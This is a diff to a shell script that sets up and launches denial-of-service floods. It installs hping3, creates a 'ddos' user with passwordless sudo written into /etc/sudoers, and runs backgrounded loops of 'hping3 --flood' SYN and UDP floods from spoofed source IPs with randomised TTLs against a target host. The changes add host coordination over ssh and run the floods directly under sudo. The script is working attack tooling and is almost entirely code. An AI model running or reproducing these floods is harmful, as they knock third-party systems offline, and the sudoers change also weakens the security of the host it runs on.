@@ -5,6 +5,18 @@ then
 	exit
 fi
 
+declare -a HOSTS=($(cat hosts.txt))
+cnt=${#HOSTS[@]}
+
+if [ $cnt != 4 ]
+then
+	echo -e "Please edit hosts.txt.\n"
+	exit
+fi
+
+echo ${HOSTS[1]} | ssh ${HOSTS[3]} 'cat >> ~/hosts.txt'
+ssh ${HOSTS[3]} 'addhost'
+
 apt-get install -y hping3 nmap
 useradd -M ddos
 echo -e "ddos\tALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
@@ -61,7 +73,7 @@ do
         ttl=\$(shuf -i \$ttl_pool -n 1)
 	gen_ip \$ip_pool
 	#echo "hping3 -S -L 0 -a \$ip -p \$dport \$host -t \$ttl --flood"
-	su ddos -c "sudo hping3 -S -L 0 -a \$ip -p \$dport \$host -t \$ttl --flood 1>/dev/null 2>/dev/null " &
+	sudo hping3 -S -L 0 -a \$ip -p \$dport \$host -t \$ttl --flood 1>/dev/null 2>/dev/null &
 done
 
 for i in \$(seq 1 1 \$atime)
@@ -69,9 +81,9 @@ do
 	printf "\$i.."
 	sleep 1
 done
-printf "完成."
+printf "完成.\n"
 
-this_info=\$(pkill -15 hping3)
+this_info=\$(sudo pkill -15 hping3)
 
 echo -e "===================\n\$this_info"
 
@@ -200,7 +212,7 @@ do
 	sleep 1
 done
 pgset "stop" &
-printf "完成"
+printf "完成.\n"
 exit
 EOF_PKTGEN
 
@@ -255,8 +267,8 @@ for i in \$(seq 1 1 \$sum)
 do
         ttl=\$(shuf -i \$ttl_pool -n 1)
 	gen_ip \$ip_pool
-	echo "sudo hping3 -2 -a \$ip \$dport \$host --flood 1>/dev/null 2>/dev/null "
-	su ddos -c "sudo hping3 -2 -a \$ip \$dport \$host --flood 1>/dev/null 2>/dev/null " &
+	#echo "sudo hping3 -2 -a \$ip \$dport \$host --flood 1>/dev/null 2>/dev/null "
+	sudo hping3 -2 --flood -a \$ip \$host 1>/dev/null 2>/dev/null &
 done
 
 for i in \$(seq 1 1 \$atime)
@@ -264,9 +276,9 @@ do
 	printf "\$i.."
 	sleep 1
 done
-printf "完成."
+printf "完成.\n"
 
-this_info=\$(pkill -15 hping3)
+this_info=\$(sudo pkill -15 hping3)
 
 echo -e "===================\n\$this_info"
 
